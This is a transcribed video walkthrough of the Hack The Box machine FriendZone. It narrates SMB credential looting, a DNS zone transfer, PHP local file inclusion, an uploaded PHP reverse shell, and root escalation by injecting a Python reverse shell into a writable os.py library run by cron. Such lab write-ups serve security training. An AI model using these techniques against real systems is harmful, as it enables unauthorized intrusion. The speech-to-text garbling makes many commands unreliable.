 what's going on YouTube the zipsak and when we're doing friend zone from hack to box which should be a relatively easy machine as long as you're quick at enumerated and not going down rabbit holes because this box is very wide but not too deep what that means is there's just a lot of services there's FTP SMB DMS and a bunch of different websites to go examine but once you find what you're supposed to be looking at it doesn't take much to find a lfi they can turn into a code execution get on the box and then just poking around normal directories you find a Python script that imports a library that you can write to so you can just edit that library with code and when the cron job runs it gets executed so with that being said let's just jump in and do this box as always begin with a map so - SC for default scripts SV enumerate versions Oh a output all formats pin the end map directory and call it friend zone and then the IP address which is 10 10 10 123 can take some time to run so I've already ran it looking at the results we have quite a few ports open and when I say take a long time to run this took 1200 seconds actually twelve thousand seconds so three and a half hours to run and in those cases you may not want to do scripts you may just want to do add map - v4 boost which shows open ports as it finds it and 10-10-10 123 we can see it discovered a bunch of open ports and already finished in two point seven six seconds so much quicker than three hours but let's go over each thing we have FTP running on port 21 and because script scanning took so long I'm not going to trust that all the scripts ran so I'm gonna mainly try logging into this with anonymous so FTP 10 10 10 123 anonymous anonymous and we'll see if that logs in if it doesn't which it doesn't we'll try search point on V SFTP and we see all the exploitable versions are in like in versions two three is much bigger than two so I'm gonna move on until we get credentials for this one so let's go over to cherry tree and just make note of that press control shift and we'll create a new sub node and I'll just create a node called notes we'll say FTP open needs creds and then let's continue on we have SSH on port 22 its SSH spanner is common with Ubuntu xenial but other than that there's nothing else we can only do we have DNS on port 53 it is running on TCP which is a little bit unique but there's nothing we can really do outside of try doing nslookup on localhost or its IP address to get a hostname disclosure but since it is running DNS if we get like subdomains and things like that that may be possible to brute-force we have HTTP on port 80 and we have the title as friendzone escape software on 139 we have NetBIOS slash SMB so i'm assuming for four or five will be open the next port is https on port 443 this HTTP title is watching you which is different than friends own escape software so is some type of like virtual host routing software something going on to give us a different page there is also an SSL certificate for a friend zone dot read on this box so we have a potential host name which we may want to double check against DNS which is on port 53 going down we have a bunch of HTTP 1.1 this is probably why my scan took forever because the script just went into some weird loop so I'm just compressed ctrl shift G to go to the bottom we can see SMB is open on port 4 4 5 the host is friend zone so we got potentially the DNS name 127 0 1 1 I don't know that's another loopback address I don't know if it's relevant or not and then we have host script results the clock is about an hour different than the server I believe and nothing really interesting here so the very first thing I'm going to do is SMB map on 10 10 10 123 to see if there's any files or open shares and we can see we have general and development general is read-only development is readwrite so I'm going to SMB map help and we're going to look at options we have - odd or recursively list files and we can also specify the depth with - - depth so I'm gonna go back to my s mb map command - capita - - depth 5 rerun that and we can see it is going to output files on that share we get one that is creds dot txt so I'm gonna do SMB client 10 10 10 123 / in general and now just hit enter for the password and we can do get creds txt and we download the file we can exit and then cat it and we get admin and the password is work work Holly Lou Holly Lou I'm not even gonna bother saying that today I'll in for some reason I can't say this word right now but let's try F tp'ing in so FTP 10 10 10 123 admin and we'll copy and paste this password paste it in and creds did not work we can try SMB map so we'll do - you admin - p put that password in and see if this finds anything and we still see guest SMB session established so maybe like - d friend zone because we should see authenticated as so that's a bit odd I'm going to try like SMB client - capital u admin 10-10-10 123 / in general and work group admins password paste it in LS let's see can we overwrite creds dark text we can't let's try the same thing put junk in the password and we go authenticated so I'm guessing SMB is configured in a weird way that says guests only but let's create a sub note here put creds because that is definitely probably going to be useful eventually so let's move on from SMB and check out HTTP so let's go to 10 10 10 123 and we get this one page we have email us at info at friendzone portal red and the last host name we had was friendzone red so we have a different domain so we have two different names we can look at HTTP 10 10 10 123 and if we want we can view this certificate view certificate go to details and go through this we have an email address ha ha at friendzone dot read that again I'm just looking for like an alternate name to see if we got anything else we just got - we got friends in portal don't read and friendzone dot read we also don't have this saying that HTTP title which is odd because there should be something that says like watching you I try index dot HTML doesn't exist index dot PHP does exist I don't know what else to try so I'm going to stop there we can try index dot PHP does exist dot HTML it does so I'm just trying to figure out what this web server is doing if it has PHP there's a chance we may be able to look at like parameters or what the page does to try to exploit it but if it's index.html chances are it's a static website which has a much smaller attack surface so notes HTTP and HTTPS have different pages virtual hosts routing and I'm making a note here because every domain name we get we should probably check both so let's do V Etsy host 10 10 10 123 and we can say friendzone dot read and friend zone portal dot read and then go back to Firefox friend zone dot read same page we can also look at whoops the page source and don't really see anything so let's go to a CPS friend zone dot red and we get a Jif or gif whatever you want to say but checking the page source here we have doing some development with a potential page J s / j s so we can try this and we get well it looks like base64 so let's echo - n paste base64 - D and I know it's not hex or anything because we got non hex characters I'm gonna try base64 again invalid input we can try WC - C 30 characters I don't know really anything interesting there refresh the page and we get something different each time so I'm just gonna move along from that but before I do we got something - I am a capping there so I check index dot PHP and the page two loads so we know that's this directory will execute PHP HTML does exist so let's put this here go in and potential go bust if we don't find anything else this directory is interesting as PHP files and then move on to friend zone portal dot read and HTTP is the same HTTP is a different page and we don't have anything here so we got two different names we got friend-zoned portal and friend zone dot read dns is on this box listening as TCP so I'm going to try a zone transfer with dig axfr that is just the syntax to do a zone transfer at the host name host IP which is 10 10 10 123 and then this zone which is friend zone red and we can see a few more domains we got administrator HR uploads so I'm going to pipe this over to zone transfer and then we can do friend zone portal dot red and we get different pages so I'm also going to put that 2-0 answer with two errors it's time to append it so if I cat this file we get booth and then I can just grep this for let's do friend zone and we can grab red let's see let's just grab carrot friend zone that's not gonna grab everything um let's see grep friend zone grep and there we go now we only got host names then awk print dollar one we can get rid of that trailing dot with said s backslash period dollar sign I need a and that quote and then we can do sort - you can put this as host and then we can end this file % s replace newline characters with a space and then write that the tap ok tap and I'm just going to copy all of this and go into my host file and we'll paste everything so now we got all the DNS name set so the next thing we want to do is a way to view all the pages so we go back into hosts press QA just start recording a macro type HTTP colon slash slash hit the down arrow hit the home button exit insert mood exit recording mode with cue and now if I just do at a it will do this but I can do like five at a to do five at a time to kind of speed that up so now that I have a list of all the URLs we can make a directory called aqua tone move that into aqua tone and then I think it's cat the file and then paste pipe it to aqua tone yep there we go and now it is hitting each one of those pages and doing screenshots and stuff so we want to individually go to each one which just kind of speeds it up especially have a lot more than this so we go into the HTML not that although we can do Firefox aquatune report and open this up let's see that we can ignore that's just a gif we have administrative one looks like a login portal so let's go to Cherrytree put this and we can say login portal actually let's do subdomains paste and then let's go down another login portal different one at least it looks much different then let's go down we can ignore that that's a meme we got uploads so let's do uploads not found not found found can we just copy now we can't but these may be derp bust things to do things we get not found but let's move with what we have we have three domains uploads definitely sounds tempting so let's go to uploads let's select an image to upload so let's go here if we can copy image location CD dot dot W get the meme a certificate ID will do curl - K - Oh Z gif if I can type there we go and when I want to get o root H to be boxes friend zone so we can just go to this portal and ctrl L root HB boxes friend zone Z dot gif upload and we get uploaded excessively and gave us a timestamp so that's weird but we can do uploads and timestamp returned no image so let's go to the login portal so we can try logging in with admin admin and we get admin page is not developed check for another one and there is a login dot PHP here we found another login portal here so let's try this one paste this in and then admin we get it saying wrong we do have creds from way before on that directory so it's copy admin you got that and copy work work hallelujah still can't say it I don't know why I know I've said that wood before but anyways log and done visit slash dashboard PHP so dashboard PHP and smart photo script for red zone Corp note we are dealing with the beginner PHP developer applications not tested we get image name parameters missing and it's giving us how we should use this page so default image IDs a dot jpg page name is timestamp so let's do this and we get something went wrong the script included the wrong / am but we get final access timestamp so if we do enter nothing there so let's try page name go back to this upload and actually put a timestamp nothing we change a dot jpg to z dot gif this thing breaks so if we do view image images z gift doesn't exist so let's go back and try timestamp final access timestamp is this and that is the same exact thing oh no that's not the same as this so don't know exactly what this is but let's try putting other things here so let's try login thinking that page name may just a pen dot PHP to timestamp and then maybe timestamp dot PHP actually we can double check that by typing like timestamp dot PHP here and we see final access timestamp is this so kind of guess the logic right there if we do login we confirm it we get wrong if we give it itself with it which is dashboard we could potentially crash this thing so we see it's transferring data and it's gonna go with a lot of data because we just loop the script and it's gonna include the dashboard which is then getting a good dashboard again and then include it again and again and again and again so that's obviously not ideal but with lfi inclusions yeah we can see in doing it if this was an old version of PHP you could try like a null byte at the end but that hasn't worked in years let's just copy this and open a new tab because she did so we can try that no bite doesn't work so the other thing that you can do with PHP is the I forget what it's called maybe I remember as I type it it's php' colon slash slash filter convert base64 encode slash resource equals and then what file you want to include so we want to include login we get the base64 of login so let's go to terminal make the site source and then we can echo dash n paste the base 64 basics for dash D and then we can say login dot PHP and this is actually called a PHP wrapper so that's what it's called we see well again like this is just hard coded same credential we had we get a cookie and then time whatever so let's check what time stamp is so we can grab this and then echo dash n base64 dash D pipe it to time-stamped PHP and then view this file which is just doing the current time so we could try to find the upload script so I'm guessing it's probably up one directory and a folder chord uploads and then probably upload dot PHP we saw we get some base64 copy this echo - n paste base64 - D - upload dot PHP and cat this and we get not finished yet and all it does is print out the time so we're not actually uploading a picture there was a nother login on what is it whereas it was friend zone / the wall again I think admin dot friendzone portal dot read so maybe like dot dot slash admin / law again let's see we'll see if this is the same thing as what we have if we just went into our own directory so the echo - n paste base64 - D login to dot PHP md5 sum log n star so we just went into our own directory what I'm trying to do is we have administrator 1 and we have admin and these are different websites but I can't seem to find where this one is because well game dot PHP may have some logic that we want right now it's just putting Z's we can go back all the way and go through our notes or something and kind of think what we have I didn't take good notes so that's not gonna be helpful but one of the things that we're missing with SMB map is comments it doesn't show them so if we did SMB client - capital L - list shares 10 10 10 123 and hit enter we have comments and it says files is in Etsy files so I'm guessing general is in Etsy general and development is in Etsy development if you went all the way back and we we took good notes we would have seen that SMB mat - capital H 10 10 10 123 we should have said and notes rip the top development is equal to read write so we upload a script here and we can execute it with / XE / development / script we may be in good shape so before I do that I just want to test one more thing with my Oh Fi that is instead of whoops adopt that slash admin won't don't want to click and hold and drag I just want to do like Etsy passwd I want to make sure I can get to the root directory I do that see Paso PD because I'm almost positive that exist and I just realized that won't work because it's a pending dot PHP and that's the same reason why I didn't try to do like ver log httpd log or whatever those alphas are is because I know the script is a pending dot PHP so we'll just come to roll with it so let's do SMB client slash / Tenten before we do that let's V we can get out of site source make the upload well the test dot PHP I'm gonna do question mark PHP echo please support me on patreon and then and that so the reason why I'm just doing an echo is because that should almost always work there are cases where if I do a reverse shell I don't know if it failed because the firewall I don't know a PHP safe mode is enabled I don't know if maybe this is some reason a Windows box Myra shell didn't work SELinux there's a bunch of reasons why a reverse shell map may fail on echo there's very few reasons why Ekta would fail we may if that fails maybe change it to print maybe change different languages but because there's very few reasons for this to fail it's an easy way to confirm something so let's do SMB client slash slash 10 10 10 123 development no password we can upload test dot PHP put test dot PHP there we go and now we can try slash Etsy development slash test and we got the page source of that which we don't need a copy we can just get rid of this filter and we can see it pasted out please support me on patreon so now we are ready to do a reverse shell so I'm going to copy user share whatever that word is there's a bunch of things I can't pronounce in this video and then PHP PHP reverse shell dot PHP and because I don't want to type that again we can just do Rev dot PHP edit this and then the IP address is down here I think I'm ten ten fourteen three probably port 9001 and let's try this so NC o-- VMP 9001 put Rev dot PHP put dot dot slash rev PHP because when I open this pane I didn't go back into the upload folder so let's just do Rev and we get a reverse shell so we'll do Python C and put PTY PTY not spawn then bash Python not found is that what it said Python C import PTY PTY not spawn man - okay I must have a type of there that I just can't read so we get that back I'm going to back down this do s TTY raw - echo hit F G then enter hit again and now we have liked a ball to complete and things like that I'm just going to do export term is equal to X term so now when I press ctrl L clears the screen so let's go in for a dub dub dub and we can see all the pages so we got friend-zoned portal admin friendzone portal admin cat login dot PHP and that's the one that we wanted it's got the same credential we also have a credential here the my SQL data calm and we have DB user friend password is that so we can copy this so let's go back to Cherrytree go to our creds friend we can say this is a DB this is web so netstat dash a and LP grep for listening and I don't see any database is listening I expected like 3306 which is my sequel so I'm just gonna do LS slash home and we see friend is a user so let's try a skewing to him sq - friend we can paste this password copy-paste and we get in so that is how you can get the users are text you can also just SSH n so have SSH friend at 10 10 10 123 base the password and now you got a normal shell here but let's keep going on with the reverse shell and we don't need that user anymore so we can exit doesn't matter I just want to prove you could do that but you don't need to so if we poke around the box if we go in like opt we see there is a server admin directory we can go into that and see reporter PI if we do LS - la there's nothing else there if we cat reporter dot PI we see some type of script import OS - from print running a command but it's commented out commented out note that says he needs to edit the script later and then Python developer so what I'm gonna do is I don't think I have it on my box let's see LSI chopped up - IPS py I do so let's go grab this do I have LS CMD where is the build go build see hopefully it builds LS there we go we have it so we can copy this which is just a go program oh yeah I'll copy it first root htb boxes friend zone and then CD into that directory and then SCP piece by to friend at 10 10 10 123 and the password we can go back to cherry tree copy/paste ssh friend at 10 10 10 123 paste chmod plus x we execute this we can see what programs execute when they execute so if i went back to this shell did LS no we don't see anything but if we wait here long enough you would see that there is a cron that is running this report about pi script which again has a lot of comments and doesn't really do anything so maybe that's red herring right now that's all we can think of because how would we exploit a print statement without even input if there was an input maybe you could exploit it if it's running Python 2 if you found a way to get into stand it in but as of right now nothing we can do so I'm going to run linen oom so let's go to CP / opt linen oom linen in got Sh to my working directory and there is one change I'm making this and that is let's see I put Thoreau equals to one right at the beginning to do Thoreau checks so let's cat win a new send it to NCL VMP port 9000 one go back to a netcat shell and just gonna go in dead they say gem in case I write disc it doesn't do anything and NC 10 10 14 3 9001 and pipes out to bash to execute and we can see Lin a Noom is running so while that runs we can go to SSH and see what's happening we see stuff showing this is from the PS PI and we can see all the commands linen oom is running so I was just doing a find looking for like a set UID and things like that grapping for things so you can see exactly what's going on the box with this PS by thing but let's go back and just again wait for this to finish which is right then so let's go to the very top if we search for Lin a new minnow history did we not okay I don't know I didn't find it so here we go so Colonel information nothing really new I'm not sure what my search isn't working but we're just using it down arrow hostname user user previously logged on who's logged on none that's interesting passwd not an interesting admin users this ADM I believe means he can read logs I forget what that permission is but I don't see anything too interesting if we saw something like LX c or something we know we could get root if you don't know how you can just look at my calamity video nothing there nothing there sudo that's something we check with friend we control oh wait here we go there's the cron running that Python script but we never checked sudo so we can do sudo - L go to cherry tree copy this password for friend and we can't run sudo so keep going down hidden files not to interesting word readable files in home not to interesting home directory not to interesting route logging is allowed to this box you mask again not interesting Cron's we don't see any con for that one script contacts contents nothing system D timers we don't see any system D time are executing that Python script or anything that's non-standard IP information we looked at net stat these are running processes and that D system D configs pachi modules here's the www directory with everything I'm gonna read write sensitive files we can't write to any sensitive files su ID there's nothing non-standard and su ID files geo ID is the same oh let's see POSIX capability set MTR - packet I don't know what this is so we can copy this and put this in notes to go research it so paste keep going world readable files Award writable files and we have our script that we uploaded an NC development and we also have user Lib Python 2.7 OS dot pi which is the Python library so right off the bat I know we have code execution now because we know that there is a script that is executing a Python script which imports OS every certain minutes because we saw that with PS bye so what I'm going to do is let's go back into that op directory oh not op paste user Lib Python 2.7 OS pi that reporter script is what was exploitable because it's importing OS which we can write to so edit the script VI is screwed we have to fix a terminal a little bit there we go so let's go to a new pane and I think it's s TTY - a and we want 34 rows 137 columns so if we go back to a netcat s TTY I think it's forget how to set maybe we'll just do 34 rows 137 Carl St - why - a that's not it how do we set maybe it's the definition first s TTY you rose 34 one call 137 and valid argument columns 137 that looks good and double check there's a good crack numbers so now when we do that VI command again a terminal is all set because it knows the correct number rows columns and earlier we set X term to [Music] terminal 2 X term so you want those three variables you want to have your terminal configured you want to do s TTY to do rows and columns configured if you want to go into any of these like GUI applications so now we does it to do a python reverse shell so what I'm going to do is we're going to Google payload all I happy with all the things copied I think CD up payload all the things this is just a github repository and let's see OS crap - I show let's just do payload all the things Python reverse shell and here we go reverse shell cheat sheet so let's go to Python and let's see we don't want this one because it's running bash commands first this looks fine so we can copy this and then let's edit it so V shell PI paste so let's see we want to replace every semicolon with a new line that did not work place every semicolon with a new line that work now so the one thing we have to do is get rid of these OS period because this is calling the OS library so that's fixed import socket we want to do our IP address which is ten ten fourteen three on port 9000 one and that looks fine so it's cat showed up I copy paste and then we'll just wait we can fix it here NCL VMP 9001 we wanted to and we could just test it with python report about pi we immediately get a show but because we executed that we didn't get a shovel as anyone important so we can just do this now and wait for that cron to run and we see and ran right then we do Who am I we are root and we can read root dot text so that is a box hope you guys enjoyed take care and I'll see you all next week